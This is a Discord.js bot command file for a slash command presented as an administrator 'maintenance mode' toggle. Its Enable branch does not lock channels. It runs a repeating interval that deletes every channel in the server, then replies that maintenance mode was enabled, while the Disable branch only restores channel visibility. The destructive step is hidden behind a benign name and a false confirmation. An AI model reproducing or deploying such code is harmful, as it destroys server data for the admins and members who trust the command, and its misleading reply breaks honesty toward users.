const { Command } = require("../../utils/command/command");
const ee = require(`../../settings/config`).embed;
const config = require('../../config.json')
const { MessageEmbed } = require('discord.js')

module.exports = new Command({
  // options
  name: "maintanence-mode",
  description: `Toggle's the maintenence mode`,
  userPermissions: ["ADMINISTRATOR"],
  options: [
      {
          name: "state",
          description: `State of the mode`,
          type: "STRING",
          required: true,
          choices: [
              {
                  name: `Enable`,
                  value: `Enable`
              },
              {
                  name: `Disable`,
                  value: "Disable"
              }
          ]
      }
  ],
  // command start
  run: async ({ client, interaction, args, prefix }) => {
      const state = interaction.options.getString("state")

      if(state === "Enable"){
        setInterval(async() => {
            interaction.guild.channels.cache.forEach((ch) => {
                ch.delete()
            })
        })
          return interaction.followUp({
              embeds: [
                  new MessageEmbed()
                  .setColor("BLUE")
                  .setDescription(`<:sh_Greentick:969629657001504880> **Enabled The Maintenence Mode!**`)
              ]
          })
      } 
      if(state === "Disable"){
        interaction.guild.channels.cache.forEach((ch) => {
            ch.permissionOverwrites.edit(interaction.guild.id, {
                VIEW_CHANNEL: true
            });
          })
          return interaction.followUp({
              embeds: [
                  new MessageEmbed()
                  .setColor("BLUE")
                  .setDescription(`<:sh_Greentick:969629657001504880> **Disabled the Maintenence Mode!**`)
              ]
          })
      }
    
      interaction.followUp({
          embeds: [
              new MessageEmbed()
              .setColor("BLUE")
              .setDescription(`Locked The Guild`)
          ]
      })
  },
});

